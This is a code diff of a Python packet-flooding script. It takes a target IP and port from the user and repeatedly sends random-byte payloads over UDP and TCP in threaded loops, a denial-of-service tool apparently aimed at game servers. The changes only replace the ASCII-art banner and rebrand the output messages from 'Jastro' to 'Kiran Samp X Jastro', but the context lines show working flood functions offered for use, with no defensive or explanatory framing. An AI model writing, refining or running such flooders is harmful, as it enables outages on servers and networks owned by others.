@@ -9,22 +9,30 @@ import sys
 import os
 
 os.system("clear")
-print("""╱╱╭╮╱╱╱╱╱╭╮
-╱╱┃┃╱╱╱╱╭╯╰╮
-╱╱┃┣━━┳━┻╮╭╋━┳━━╮
-╭╮┃┃╭╮┃━━┫┃┃╭┫╭╮┃
-┃╰╯┃╭╮┣━━┃╰┫┃┃╰╯┃
-╰━━┻╯╰┻━━┻━┻╯╰━━╯
-╭━━╮╱╱╭━━━╮
-╰┫┣╯╱╱┃╭━╮┃
-╱┃┃╭━╮┃┃╱╰╋━━┳╮╭┳┳━╮╭━━╮
-╱┃┃┃╭╮┫┃╱╭┫╭╮┃╰╯┣┫╭╮┫╭╮┃
-╭┫┣┫┃┃┃╰━╯┃╰╯┃┃┃┃┃┃┃┃╰╯┃
-╰━━┻╯╰┻━━━┻━━┻┻┻┻┻╯╰┻━╮┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
+print("""───────▄▀▀▀▀▀▀▀▀▀▀▄▄
+────▄▀▀░░░░░░░░░░░░░▀▄
+──▄▀░░░░░░░░░░░░░░░░░░▀▄
+──█░░░░░░░░░░░░░░░░░░░░░▀▄
+─▐▌░░░░░░░░▄▄▄▄▄▄▄░░░░░░░▐▌
+─█░░░░░░░░░░░▄▄▄▄░░▀▀▀▀▀░░█
+▐▌░░░░░░░▀▀▀▀░░░░░▀▀▀▀▀░░░▐▌
+█░░░░░░░░░▄▄▀▀▀▀▀░░░░▀▀▀▀▄░█
+█░░░░░░░░░░░░░░░░▀░░░▐░░░░░▐▌
+▐▌░░░░░░░░░▐▀▀██▄░░░░░░▄▄▄░▐▌
+─█░░░░░░░░░░░▀▀▀░░░░░░▀▀██░░█
+─▐▌░░░░▄░░░░░░░░░░░░░▌░░░░░░█
+──▐▌░░▐░░░░░░░░░░░░░░▀▄░░░░░█
+───█░░░▌░░░░░░░░▐▀░░░░▄▀░░░▐▌
+───▐▌░░▀▄░░░░░░░░▀░▀░▀▀░░░▄▀
+───▐▌░░▐▀▄░░░░░░░░░░░░░░░░█
+───▐▌░░░▌░▀▄░░░░▀▀▀▀▀▀░░░█
+───█░░░▀░░░░▀▄░░░░░░░░░░▄▀
+──▐▌░░░░░░░░░░▀▄░░░░░░▄▀
+─▄▀░░░▄▀░░░░░░░░▀▀▀▀█▀
+▀░░░▄▀░░░░░░░░░░▀░░░▀▀▀▀▄▄▄▄▄
+
 """)
-print("""Jastrooo"")
+print("""KIRAN X JASTRO""")
 
 ip = str(input(" IP :"))
 port = int(input(" Port :"))
@@ -52,9 +60,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Jastro in Coming")
+			print(i +" Kiran Samp X Jastro")
 		except:
-			print("[!]  Jastro in Coming")
+			print("[!]  Kiran Samp X Jastro")
 
 def run2():
 	data = random._urandom(1204)
@@ -66,10 +74,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Jastro in Coming")
+			print(i +" Kiran Samp X Jastro")
 		except:
 			s.close()
-			print("[*] Jastro in Coming")
+			print("[*] Kiran Samp X Jastro")
             
 
 def run3():
@@ -82,10 +90,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Jastro in Coming")
+			print(i +" Kiran Samp X Jastro")
 		except:
 			s.close()
-			print("[*] Jastro in coming")
+			print("[*] Kiran Samp X Jastro")
             
   
 def run4():
@@ -98,10 +106,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Jastro in Coming")
+			print(i +" Kiran Samp X Jastro")
 		except:
 			s.close()
-			print("[*] Jastro in Coming")
+			print("[*] Kiran Samp X Jastro")
 			
 def run5():
 	data = random._urandom(16)
@@ -113,10 +121,10 @@ def run5():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Jastro in Coming")
+			print(i +" Kiran Samp X Jastro")
 		except:
 			s.close()
-			print("[*] Jastro in coming")
+			print("[*] Kiran Samp X Jastro")
             
 #Urandom Dan Pacotes
 class MyThread(threading.Thread):
